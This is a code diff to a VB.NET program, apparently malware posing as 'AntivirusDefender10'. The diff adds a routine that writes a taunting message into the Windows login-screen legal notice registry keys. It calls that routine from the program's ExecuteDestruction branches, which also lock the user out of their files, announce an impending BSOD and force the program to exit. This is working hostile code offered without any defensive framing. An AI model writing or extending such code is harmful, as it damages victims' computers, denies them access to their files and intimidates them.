@@ -331,6 +331,24 @@ Public Class Form1
             End Try
         End Sub
 
+        Private Sub LegalNotice()
+            Try
+                ' Open the registry key where the login message is stored
+                Dim regKey As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True)
+
+                ' Set the title and message for the login screen
+                regKey.SetValue("legalnoticecaption", "AntivirusDefender10 HERE!")
+                regKey.SetValue("legalnoticetext", "AntivirusDefender 10 watching you well you wanted this!")
+
+                ' Close the registry key
+                regKey.Close()
+
+                Console.WriteLine("Login message set successfully.")
+            Catch ex As Exception
+                Console.WriteLine("Error setting login message: " & ex.Message)
+            End Try
+        End Sub
+
         ' Function to execute different payloads based on user choice
         Public Sub ExecuteDestruction(choice As String)
             ' Create an instance of the ComodoAntivirusDetector class
@@ -390,13 +408,18 @@ Public Class Form1
                         timerLabel.Text = "Surprise! Executing less destructive effects!"
                         Thread.Sleep(5000)
                         Form1.CreateEpicScriptFiles()
+                        LegalNotice()
                         MessageBox.Show("To apply changes, you need to restart your computer.", "Restart Required", MessageBoxButtons.OK, MessageBoxIcon.Warning)
+                        Environment.Exit(0)
 
                     Case "Just Make Unusable My PC Without Destruction"
                         ' Code for access restrictions
-                        timerLabel.Text = "You can't access your files anymore!"
+                        timerLabel.Text = "You can't access your files anymore! You have more than 60 seconds before BSOD!"
                         Thread.Sleep(5000)
+                        LegalNotice()
                         ApplyAccessRestrictions()
+                        Thread.Sleep(60000)
+                        Environment.Exit(0)
 
                     Case Else
                         timerLabel.Text = "Invalid choice!"
